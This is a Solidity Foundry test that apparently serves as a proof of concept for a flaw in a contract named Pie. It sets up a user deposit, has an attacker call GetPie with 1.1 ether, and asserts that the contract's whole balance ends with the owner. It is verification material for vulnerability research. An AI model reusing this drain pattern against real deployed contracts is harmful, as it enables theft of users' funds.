// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol";

contract Pie_Exploit_Test is Test {
    Pie pie;
    address owner = makeAddr("owner");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);
        vm.deal(attacker, 10 ether);
        
        vm.prank(owner);
        pie = new Pie();
    }
    
    function test_UserCanDrainContract() public {
        // User deposits 0.5 ether legitimately
        vm.prank(user);
        vm.deal(user, 0.5 ether);
        (bool success,) = address(pie).call{value: 0.5 ether}("");
        require(success, "User deposit failed");
        
        // Verify initial contract balance
        assertEq(address(pie).balance, 0.5 ether, "Incorrect contract balance");
        
        // Capture pre-attack state
        console2.log("--- BEFORE-Trigger ---");
        uint256 contractBalanceBefore = address(pie).balance;
        uint256 ownerBalanceBefore = owner.balance;
        console2.log("Contract ETH balance:", contractBalanceBefore);
        console2.log("Owner ETH balance:", ownerBalanceBefore);
        
        console2.log("--- Trigger (Attacker calls GetPie) ---");
        // Attacker triggers vulnerability with >1 ether
        vm.prank(attacker);
        pie.GetPie{value: 1.1 ether}();
        
        console2.log("--- AFTER-Trigger ---");
        // Capture post-attack state
        uint256 contractBalanceAfter = address(pie).balance;
        uint256 ownerBalanceAfter = owner.balance;
        console2.log("Contract ETH balance:", contractBalanceAfter);
        console2.log("Owner ETH balance:", ownerBalanceAfter);
        
        // Verify state changes
        bool contractDrained = (contractBalanceAfter == 0);
        bool ownerReceivedFunds = (ownerBalanceAfter == ownerBalanceBefore + 1.6 ether);
        bool exploitSuccessful = contractDrained && ownerReceivedFunds;
        
        // Final vulnerability verdict
        if (exploitSuccessful) {
            console2.log("Vulnerability Exists: Contract balance drained and funds transferred to owner");
        } else {
            console2.log("Vulnerability not Exist: Contract not drained or owner didn't receive funds");
        }
        
        // Maintain original test assertions
        assertEq(contractBalanceAfter, 0, "Contract not drained");
        assertEq(ownerBalanceAfter, ownerBalanceBefore + 1.6 ether, "Owner received incorrect amount");
    }
}